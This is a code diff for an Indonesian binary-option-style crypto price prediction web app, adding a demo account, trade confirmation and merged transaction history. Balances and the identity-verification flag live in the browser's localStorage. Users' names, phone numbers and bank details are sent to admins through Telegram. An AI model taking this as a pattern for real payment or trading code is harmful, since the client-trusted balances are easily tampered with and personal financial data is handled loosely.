-                document.getElementById('btn-close-deposit').style.display = 'inline-block'; document.getElementById('btn-cancel-deposit').style.display = 'inline-block';
+            document.getElementById('deposit-step-1').style.display = 'block'; document.getElementById('deposit-step-2').style.display = 'none'; document.getElementById('deposit-amount').value = ''; 
+            document.getElementById('deposit-step-2').innerHTML = `<p style="color:var(--green); font-weight:bold; font-size:18px;" id="deposit-amount-display">Rp 0</p><div id="qris-loading"><div class="loading-spinner"></div><p style="color:var(--text-muted); font-size:12px; margin-bottom:15px;" id="qris-status-text"></p></div><div id="qris-ready" class="qris-box"><img id="qris-image-tag" src="" alt="QRIS"></div><div id="qris-instruction" class="instruction-box"><strong>Cara Pembayaran:</strong><br>1. Scan QRIS pada M-Banking / E-Wallet.<br>2. Pastikan nominal transfer sesuai.<br>3. Saldo otomatis diproses.<br><span style="color:var(--red); margin-top:5px; display:block; font-weight:bold;" id="deposit-timer">Kedaluwarsa dalam: 15:00</span></div><button class="btn-modal" id="btn-close-deposit" onclick="closeTargetModal('deposit-modal')">Tutup Halaman</button><button class="btn-modal btn-modal-danger" id="btn-cancel-deposit" onclick="cancelDeposit()">Batalkan Request</button>`;
+            
+            // Logika Akun Standar yg nyangkut (opsional)
+            if (accountType === 'standard') {
+                let activeDeposit = JSON.parse(localStorage.getItem(`sanz_active_deposit_${currentUserPhone}`)); 
+                if (activeDeposit && activeDeposit.status === 'Menunggu' && (activeDeposit.endTime ? activeDeposit.endTime > Date.now() : true)) {
+                    document.getElementById('deposit-step-1').style.display = 'none'; document.getElementById('deposit-step-2').style.display = 'block';
+                    document.getElementById('deposit-amount-display').style.display = 'block'; document.getElementById('deposit-amount-display').innerText = formatIDR(activeDeposit.amount);
+                    document.getElementById('btn-close-deposit').style.display = 'inline-block'; document.getElementById('btn-cancel-deposit').style.display = 'inline-block';
 
-                if (activeDeposit.qrUrl) { showQR(activeDeposit.qrUrl, activeDeposit, true); } 
-                else {
-                    document.getElementById('qris-loading').style.display = 'block'; document.getElementById('qris-ready').style.display = 'none'; document.getElementById('qris-instruction').style.display = 'none';
-                    document.getElementById('qris-loading').innerHTML = `<div class="loading-spinner"></div><p style="color:var(--text-muted); font-size:12px; margin-bottom:15px;" id="qris-status-text"></p>`;
+                    if (activeDeposit.qrUrl) { showQR(activeDeposit.qrUrl, activeDeposit, true); } 
+                    else {
+                        document.getElementById('qris-loading').style.display = 'block'; document.getElementById('qris-ready').style.display = 'none'; document.getElementById('qris-instruction').style.display = 'none';
+                        document.getElementById('qris-loading').innerHTML = `<div class="loading-spinner"></div><p style="color:var(--text-muted); font-size:12px; margin-bottom:15px;" id="qris-status-text"></p>`;
+                    }
                 }
-            } else {
-                document.getElementById('deposit-step-1').style.display = 'block'; document.getElementById('deposit-step-2').style.display = 'none'; document.getElementById('deposit-amount').value = ''; 
-                document.getElementById('deposit-step-2').innerHTML = `<p style="color:var(--green); font-weight:bold; font-size:18px;" id="deposit-amount-display">Rp 0</p><div id="qris-loading"><div class="loading-spinner"></div><p style="color:var(--text-muted); font-size:12px; margin-bottom:15px;" id="qris-status-text"></p></div><div id="qris-ready" class="qris-box"><img id="qris-image-tag" src="" alt="QRIS"></div><div id="qris-instruction" class="instruction-box"><strong>Cara Pembayaran:</strong><br>1. Scan QRIS pada M-Banking / E-Wallet.<br>2. Pastikan nominal transfer sesuai.<br>3. Saldo otomatis diproses.<br><span style="color:var(--red); margin-top:5px; display:block; font-weight:bold;" id="deposit-timer">Kedaluwarsa dalam: 15:00</span></div><button class="btn-modal" id="btn-close-deposit" onclick="closeTargetModal('deposit-modal')">Tutup Halaman</button><button class="btn-modal btn-modal-danger" id="btn-cancel-deposit" onclick="cancelDeposit()">Batalkan Request</button>`;
             }
             openTargetModal('deposit-modal'); 
         }
@@ -1440,20 +1548,30 @@
             if(isNaN(amount) || amount < 50000) return showModal("Peringatan", "Minimal isi saldo Rp 50.000", "error");
 
             let trxId = Date.now();
-            let activeDeposit = { id: trxId, uid: userID, amount: amount, status: 'Menunggu', startTime: Math.floor(Date.now() / 1000) };
-            localStorage.setItem(`sanz_active_deposit_${currentUserPhone}`, JSON.stringify(activeDeposit));
+            let timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
-            document.getElementById('deposit-step-1').style.display = 'none'; document.getElementById('deposit-step-2').style.display = 'block';
-            document.getElementById('deposit-amount-display').style.display = 'block'; document.getElementById('deposit-amount-display').innerText = formatIDR(amount);
-            document.getElementById('btn-close-deposit').style.display = 'inline-block'; document.getElementById('btn-cancel-deposit').style.display = 'inline-block';
+            if (accountType === 'demo') {
+                demoBalance += amount;
+                updateBalanceDisplay();
+                demoHistory.unshift({ id: trxId, type: 'Deposit', amount: amount, time: timeStr, status: 'Berhasil', info: 'Akun Demo' });
+                saveDataLocally(); renderHistory();
+                showModal("Sukses", `Saldo Demo berhasil ditambahkan: ${formatIDR(amount)}`, "win");
+                closeTargetModal('deposit-modal');
+            } else {
+                let activeDeposit = { id: trxId, uid: userID, amount: amount, status: 'Menunggu', startTime: Math.floor(Date.now() / 1000) };
+                localStorage.setItem(`sanz_active_deposit_${currentUserPhone}`, JSON.stringify(activeDeposit));
 
-            document.getElementById('qris-loading').style.display = 'block'; document.getElementById('qris-ready').style.display = 'none'; document.getElementById('qris-instruction').style.display = 'none';
+                document.getElementById('deposit-step-1').style.display = 'none'; document.getElementById('deposit-step-2').style.display = 'block';
+                document.getElementById('deposit-amount-display').style.display = 'block'; document.getElementById('deposit-amount-display').innerText = formatIDR(amount);
+                document.getElementById('btn-close-deposit').style.display = 'inline-block'; document.getElementById('btn-cancel-deposit').style.display = 'inline-block';
+                document.getElementById('qris-loading').style.display = 'block'; document.getElementById('qris-ready').style.display = 'none'; document.getElementById('qris-instruction').style.display = 'none';
 
-            const msg = `*REQUEST ISI SALDO*\n\nUser ID: ${userID}\nAkun: ${currentUserName} (${currentUserPhone})\nNominal: Rp ${amount.toLocaleString('id-ID')}\nStatus: Menunggu Konfirmasi.\n\n----- AKSI ADMIN -----\n\nKirim QRIS:\n\`/send ${userID}\`\n\nKonfirmasi Pembayaran:\n\`/acc ${amount} ${userID}\`\n\nTolak Request:\n\`/tolak ${userID}\``;
-            sendToTelegram(msg);
+                const msg = `*REQUEST ISI SALDO*\n\nUser ID: ${userID}\nAkun: ${currentUserName} (${currentUserPhone})\nNominal: Rp ${amount.toLocaleString('id-ID')}\nStatus: Menunggu Konfirmasi.\n\n----- AKSI ADMIN -----\n\nKirim QRIS:\n\`/send ${userID}\`\n\nKonfirmasi Pembayaran:\n\`/acc ${amount} ${userID}\`\n\nTolak Request:\n\`/tolak ${userID}\``;
+                sendToTelegram(msg);
 
-            tradeHistory.unshift({ id: trxId, type: 'Deposit', amount: amount, time: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }), status: 'Menunggu' });
-            saveDataLocally(); renderHistory();
+                tradeHistory.unshift({ id: trxId, type: 'Deposit', amount: amount, time: timeStr, status: 'Menunggu' });
+                saveDataLocally(); renderHistory();
+            }
         }
 
         async function fetchQRImage(file_id, activeDeposit) {
@@ -1496,25 +1614,24 @@
             if (idx !== -1) { tradeHistory[idx].status = status; if (newAmount !== null) tradeHistory[idx].amount = newAmount; saveDataLocally(); renderHistory(); }
         }
 
-        // --- VERIFIKASI WAJIB UNTUK WITHDRAW (NEW) ---
+        // --- Withdraw ---
         function openWithdrawModal() { 
             if (!requireLogin()) return;
             if (isUserBlocked()) return showModal("Terblokir", "Akun Anda diblokir, fitur withdraw dinonaktifkan.", "error");
 
-            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
-            let userData = usersDb[currentUserPhone];
-            
-            // Cek Status Verifikasi Pengguna
-            if (!userData || !userData.isVerified) {
-                showModal("Verifikasi Diperlukan", "Mohon lakukan verifikasi identitas (KTP & Wajah) untuk dapat menarik saldo.", "error");
+            if (accountType === 'standard') {
+                let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+                let userData = usersDb[currentUserPhone];
                 
-                // Secara otomatis memunculkan verifikasi KTP setelah modal error tertutup
-                setTimeout(() => {
-                    closeInfoModal();
-                    openKTPModal();
-                }, 2000);
-                
-                return;
+                if (!userData || !userData.isVerified) {
+                    if (userData && userData.verifStatus === 'pending') {
+                        return showModal("Diproses", "Data verifikasi Anda sedang diperiksa oleh Admin. Mohon tunggu.", "info");
+                    } else {
+                        showModal("Verifikasi Diperlukan", "Mohon lakukan verifikasi identitas (KTP & Wajah) untuk dapat menarik saldo.", "error");
+                        setTimeout(() => { closeInfoModal(); openKTPModal(); }, 2000);
+                        return;
+                    }
+                }
             }
 
             checkSavedBank(); openTargetModal('withdraw-modal'); 
@@ -1525,7 +1642,8 @@
             if(saved) {
                 document.getElementById('wd-setup-bank').style.display = 'none'; document.getElementById('wd-form').style.display = 'block';
                 document.getElementById('saved-bank-name').innerText = saved.name.toUpperCase(); document.getElementById('saved-bank-provider').innerText = saved.provider; document.getElementById('saved-bank-number').innerText = saved.number;
-                document.getElementById('wd-amount').placeholder = `Tersedia: ${formatIDR(userBalance)}`;
+                let activeBal = accountType === 'demo' ? demoBalance : userBalance;
+                document.getElementById('wd-amount').placeholder = `Tersedia: ${formatIDR(activeBal)}`;
             } else { document.getElementById('wd-setup-bank').style.display = 'block'; document.getElementById('wd-form').style.display = 'none'; }
         }
         function saveBankDetails() {
@@ -1538,31 +1656,45 @@
         
         function checkWdBalance() {
             const amount = parseInt(document.getElementById('wd-amount').value), btn = document.getElementById('btn-submit-wd');
-            let total = amount + WD_FEE;
-            if(total > userBalance) { btn.style.background = "var(--red)"; btn.innerText = "Saldo Tidak Cukup"; btn.disabled = true; } 
+            let activeBal = accountType === 'demo' ? demoBalance : userBalance;
+            let total = accountType === 'demo' ? amount : amount + WD_FEE;
+
+            if(total > activeBal) { btn.style.background = "var(--red)"; btn.innerText = "Saldo Tidak Cukup"; btn.disabled = true; } 
             else { btn.style.background = "var(--text-main)"; btn.innerText = "Tarik Saldo"; btn.disabled = false; }
         }
 
         function submitWithdraw() {
             const amount = parseInt(document.getElementById('wd-amount').value);
             if(isNaN(amount) || amount < 50000) return showModal("Peringatan","Minimal penarikan Rp 50.000", "error");
-            let totalDeduct = amount + WD_FEE;
-            if(totalDeduct > userBalance) return showModal("Peringatan",`Saldo tidak cukup (Termasuk biaya admin Rp 7.500)`, "error");
+            
+            let activeBal = accountType === 'demo' ? demoBalance : userBalance;
+            let totalDeduct = accountType === 'demo' ? amount : amount + WD_FEE;
+
+            if(totalDeduct > activeBal) return showModal("Peringatan", accountType === 'demo' ? "Saldo tidak cukup." : "Saldo tidak cukup (Termasuk biaya admin Rp 7.500)", "error");
 
             const saved = JSON.parse(localStorage.getItem(`sanz_bank_${currentUserPhone}`)); const withdrawId = Date.now();
-            
-            let activeWithdraw = { id: withdrawId, uid: userID, amount: amount, status: 'Menunggu', startTime: Math.floor(Date.now() / 1000) };
-            localStorage.setItem(`sanz_active_withdraw_${currentUserPhone}`, JSON.stringify(activeWithdraw));
+            let timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
-            userBalance -= totalDeduct; updateBalanceDisplay();
-            
-            const msg = `*REQUEST PENARIKAN*\n\nUser ID: ${userID}\nAkun: ${currentUserName}\nNominal Cair: Rp ${amount.toLocaleString('id-ID')}\nFee Admin: Rp 7.500\nBank: ${saved.provider}\nNama: ${saved.name}\nNo Rek: ${saved.number}\n\n----- AKSI ADMIN -----\n\nTERIMA PENARIKAN:\n\`/acc_wd ${userID}\`\n\nTOLAK PENARIKAN:\n\`/tolak_wd ${userID}\``;
-            sendToTelegram(msg);
+            if (accountType === 'demo') {
+                demoBalance -= totalDeduct; updateBalanceDisplay();
+                demoHistory.unshift({ id: withdrawId, type: 'Withdraw', amount: amount, time: timeStr, status: 'Berhasil', info: 'Akun Demo' });
+                saveDataLocally(); renderHistory();
+                showModal("Berhasil", `Penarikan saldo demo sebesar ${formatIDR(amount)} berhasil.`, "win");
+                closeTargetModal('withdraw-modal');
+            } else {
+                let activeWithdraw = { id: withdrawId, uid: userID, amount: amount, status: 'Menunggu', startTime: Math.floor(Date.now() / 1000) };
+                localStorage.setItem(`sanz_active_withdraw_${currentUserPhone}`, JSON.stringify(activeWithdraw));
 
-            tradeHistory.unshift({ id: withdrawId, type: 'Withdraw', amount: amount, time: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }), status: 'Menunggu', info: saved.provider });
-            saveDataLocally(); renderHistory();
+                userBalance -= totalDeduct; updateBalanceDisplay();
+                
+                const msg = `*REQUEST PENARIKAN*\n\nUser ID: ${userID}\nAkun: ${currentUserName}\nNominal Cair: Rp ${amount.toLocaleString('id-ID')}\nFee Admin: Rp 7.500\nBank: ${saved.provider}\nNama: ${saved.name}\nNo Rek: ${saved.number}\n\n----- AKSI ADMIN -----\n\nTERIMA PENARIKAN:\n\`/acc_wd ${userID}\`\n\nTOLAK PENARIKAN:\n\`/tolak_wd ${userID}\``;
+                sendToTelegram(msg);
 
-            showModal("Diproses", `Permintaan penarikan berhasil dikirim (Dipotong Fee Rp 7.500).`, "win"); closeTargetModal('withdraw-modal');
+                tradeHistory.unshift({ id: withdrawId, type: 'Withdraw', amount: amount, time: timeStr, status: 'Menunggu', info: saved.provider });
+                saveDataLocally(); renderHistory();
+
+                showModal("Diproses", `Permintaan penarikan berhasil dikirim (Dipotong Fee Rp 7.500).`, "win"); closeTargetModal('withdraw-modal');
+            }
         }
 
         function updateWithdrawHistoryStatus(historyId, status) {
@@ -1600,28 +1732,45 @@
         // --- Render UI History ---
         function renderHistory() {
             elHistoryBox.innerHTML = ''; elFullHistoryList.innerHTML = '';
-            tradeHistory.forEach((h, index) => {
+            
+            // Gabungkan riwayat demo dan riwayat standar, lalu urutkan berdasarkan ID (waktu)
+            let combinedHistory = [];
+            tradeHistory.forEach(h => combinedHistory.push({...h, isDemo: false}));
+            demoHistory.forEach(h => combinedHistory.push({...h, isDemo: true}));
+            combinedHistory.sort((a, b) => b.id - a.id);
+
+            combinedHistory.forEach((h, index) => {
                 let iconClass, iconColor, title, subtitle, amountStr, statusColorClass;
+                let demoTag = h.isDemo ? `<span style="font-size:9px; background:#2196f3; color:#fff; padding:2px 4px; border-radius:3px; margin-left:5px;">DEMO</span>` : '';
+
                 if (h.type === 'Trade') {
                     const isWin = h.status === 'Benar', isWait = h.status === 'Menunggu';
                     statusColorClass = isWait ? 'wait-text' : (isWin ? 'win-text' : 'lose-text');
                     const diffAmount = isWin ? (h.payout - h.amount) : h.amount;
                     amountStr = isWait ? formatIDR(h.amount) : `${isWin ? '+' : '-'}${formatIDR(diffAmount)}`;
                     iconColor = h.side === 'Naik' ? 'var(--green)' : 'var(--red)'; iconClass = h.side === 'Naik' ? 'bi-graph-up-arrow' : 'bi-graph-down-arrow';
-                    title = `Prediksi ${h.side} (${h.asset || 'BTC/USDT'})`; subtitle = `Awal: ${h.entry} ${isWait ? '' : `▶ Akhir: ${h.endPrice}`}`;
+                    title = `Prediksi ${h.side} (${h.asset || 'BTC/USDT'})${demoTag}`; subtitle = `Awal: ${h.entry} ${isWait ? '' : `▶ Akhir: ${h.endPrice}`}`;
                 } else if (h.type === 'Deposit') {
                     statusColorClass = h.status === 'Menunggu' ? 'wait-text' : (h.status === 'Dibatalkan' ? 'lose-text' : 'win-text');
-                    amountStr = `+${formatIDR(h.amount)}`; iconColor = '#2196f3'; iconClass = 'bi-wallet2'; title = 'Isi Saldo'; subtitle = 'QRIS Pembayaran';
+                    amountStr = `+${formatIDR(h.amount)}`; iconColor = '#2196f3'; iconClass = 'bi-wallet2'; title = `Isi Saldo${demoTag}`; subtitle = h.info || 'QRIS Pembayaran';
                 } else if (h.type === 'Withdraw') {
                     statusColorClass = h.status === 'Menunggu' ? 'wait-text' : (h.status === 'Dibatalkan' ? 'lose-text' : 'win-text');
-                    amountStr = `-${formatIDR(h.amount)}`; iconColor = '#ff9800'; iconClass = 'bi-cash-stack'; title = 'Penarikan'; subtitle = h.info || 'Transfer Bank';
+                    amountStr = `-${formatIDR(h.amount)}`; iconColor = '#ff9800'; iconClass = 'bi-cash-stack'; title = `Penarikan${demoTag}`; subtitle = h.info || 'Transfer Bank';
                 }
                 const historyHTML = `<div class="history-item"><div style="font-size: 24px; color: ${iconColor};"><i class="bi ${iconClass}"></i></div><div class="hist-info"><h4>${title}</h4><p>${h.time}</p><div class="hist-prices">${subtitle}</div></div><div class="hist-result"><h4 class="${statusColorClass}">${h.status}</h4><p class="${statusColorClass}">${amountStr}</p></div></div>`;
-                if (index < 3) elHistoryBox.innerHTML += historyHTML; elFullHistoryList.innerHTML += historyHTML;
+                
+                // Show latest 3 in the dashboard regardless of account type
+                if (index < 3) elHistoryBox.innerHTML += historyHTML; 
+                elFullHistoryList.innerHTML += historyHTML;
             });
+            
+            if(combinedHistory.length === 0) {
+                elHistoryBox.innerHTML = '<div style="text-align:center; padding:20px; font-size:12px; color:var(--text-muted);">Belum ada transaksi.</div>';
+                elFullHistoryList.innerHTML = '<div style="text-align:center; padding:20px; font-size:12px; color:var(--text-muted);">Belum ada transaksi.</div>';
+            }
         }
 
-        // --- Chart & WebSocket (Multi Asset Support) ---
+        // --- Chart & WebSocket ---
         const ctx = document.getElementById('liveChart').getContext('2d');
         const priceChart = new Chart(ctx, {
             type: 'line', data: { labels: Array(30).fill(''), datasets: [{ label: 'BTC/USDT', data: Array(30).fill(null), borderColor: '#00e676', borderWidth: 2, pointRadius: 0, pointHoverRadius: 4, fill: true, backgroundColor: 'rgba(0, 230, 118, 0.1)', tension: 0.2 }] },
@@ -1693,8 +1842,10 @@
                 let parsed = JSON.parse(savedTrade); let remTime = Math.floor((parsed.endTime - Date.now()) / 1000);
                 if(parsed.asset === 'ETH/USDT') selectAsset('ethusdt', 'Ethereum', 'ETH'); else selectAsset('btcusdt', 'Bitcoin', 'BTC');
                 tradeSession = parsed; activeTrading = true; timerCount = remTime > 0 ? remTime : 1; 
+                accountType = parsed.actType || 'standard'; // restore context account type
                 elDirection.innerText = tradeSession.side === 'Naik' ? 'Bullish' : 'Bearish'; elDirection.className = tradeSession.side === 'Naik' ? 'status-value bullish' : 'status-value bearish';
                 elBetDisplay.innerText = formatIDR(tradeSession.amount); elEntryPrice.innerText = tradeSession.entry;
+                updateBalanceDisplay();
                 startTradeTimer();
             }
         }
@@ -1718,7 +1869,7 @@
         }
 
         // --- Core Trading Logic ---
-        function executeTrade(chosenSide) {
+        function openTradeConfirmModal(chosenSide) {
             if (!requireLogin()) return;
             if (isUserBlocked()) return showModal("Terblokir", "Akun Anda diblokir, fitur trading dinonaktifkan.", "error");
             if (activeTrading) return showModal("Peringatan", "Tunggu sesi periode saat ini selesai.", "error");
@@ -1726,16 +1877,45 @@
 
             let inputAmount = parseInt(document.getElementById('bet-input').value);
             if (isNaN(inputAmount) || inputAmount < 10000) return showModal("Peringatan", "Minimal prediksi Rp 10.000", "error");
-            if (inputAmount > userBalance) return showModal("Perhatian", "Saldo tidak mencukupi.", "error");
+            
+            let activeBal = accountType === 'demo' ? demoBalance : userBalance;
+            if (inputAmount > activeBal) return showModal("Perhatian", "Saldo tidak mencukupi.", "error");
 
-            userBalance -= inputAmount; updateBalanceDisplay();
+            pendingTradeSide = chosenSide;
+            document.getElementById('tc-asset').innerText = currentSymbol;
+            document.getElementById('tc-side').innerText = chosenSide;
+            document.getElementById('tc-side').style.color = chosenSide === 'Naik' ? 'var(--green)' : 'var(--red)';
+            document.getElementById('tc-amount').innerText = formatIDR(inputAmount);
+
+            openTargetModal('trade-confirm-modal');
+        }
+
+        function confirmTrade() {
+            closeTargetModal('trade-confirm-modal');
+            
+            let inputAmount = parseInt(document.getElementById('bet-input').value);
+            
+            if (accountType === 'demo') {
+                demoBalance -= inputAmount; 
+            } else {
+                userBalance -= inputAmount; 
+            }
+            updateBalanceDisplay();
+            
             activeTrading = true; timerCount = 60;
-            tradeSession = { id: Date.now(), type: 'Trade', side: chosenSide, amount: inputAmount, entry: globalPrice, asset: currentSymbol };
+            tradeSession = { id: Date.now(), type: 'Trade', side: pendingTradeSide, amount: inputAmount, entry: globalPrice, asset: currentSymbol };
 
-            elDirection.innerText = chosenSide === 'Naik' ? 'Bullish' : 'Bearish'; elDirection.className = chosenSide === 'Naik' ? 'status-value bullish' : 'status-value bearish';
+            elDirection.innerText = pendingTradeSide === 'Naik' ? 'Bullish' : 'Bearish'; elDirection.className = pendingTradeSide === 'Naik' ? 'status-value bullish' : 'status-value bearish';
             elBetDisplay.innerText = formatIDR(inputAmount); elEntryPrice.innerText = tradeSession.entry;
 
-            tradeHistory.unshift({ id: tradeSession.id, type: 'Trade', asset: tradeSession.asset, side: tradeSession.side, time: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }), amount: tradeSession.amount, entry: tradeSession.entry, status: 'Menunggu', endPrice: '-', payout: 0 });
+            let timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            let tradeObj = { id: tradeSession.id, type: 'Trade', asset: tradeSession.asset, side: tradeSession.side, time: timeStr, amount: tradeSession.amount, entry: tradeSession.entry, status: 'Menunggu', endPrice: '-', payout: 0 };
+            
+            if(accountType === 'demo') {
+                demoHistory.unshift(tradeObj);
+            } else {
+                tradeHistory.unshift(tradeObj);
+            }
             
             saveDataLocally(); renderHistory(); startTradeTimer();
         }
@@ -1756,12 +1936,22 @@
             if (tradeSession.side === 'Turun' && finalPrice < tradeSession.entry) userWin = true;
 
             let resultLabel = "Salah", returnCash = 0;
-            if (userWin) { returnCash = tradeSession.amount * 2; userBalance += returnCash; resultLabel = "Benar"; winstreakCount++; } 
-            else { winstreakCount = 0; }
+            if (userWin) { 
+                returnCash = tradeSession.amount * 2; 
+                if(accountType === 'demo') demoBalance += returnCash; 
+                else { userBalance += returnCash; winstreakCount++; }
+                resultLabel = "Benar"; 
+            } 
+            else { 
+                if(accountType !== 'demo') winstreakCount = 0; 
+            }
 
-            updateBalanceDisplay(); updateWinstreakUI(); 
-            let activeTradeIndex = tradeHistory.findIndex(h => h.id === tradeSession.id);
-            if(activeTradeIndex !== -1) { tradeHistory[activeTradeIndex].status = resultLabel; tradeHistory[activeTradeIndex].endPrice = finalPrice; tradeHistory[activeTradeIndex].payout = returnCash; }
+            updateBalanceDisplay(); 
+            if(accountType !== 'demo') updateWinstreakUI(); 
+            
+            let targetHistory = accountType === 'demo' ? demoHistory : tradeHistory;
+            let activeTradeIndex = targetHistory.findIndex(h => h.id === tradeSession.id);
+            if(activeTradeIndex !== -1) { targetHistory[activeTradeIndex].status = resultLabel; targetHistory[activeTradeIndex].endPrice = finalPrice; targetHistory[activeTradeIndex].payout = returnCash; }
             
             activeTrading = false; saveDataLocally(); renderHistory();
 
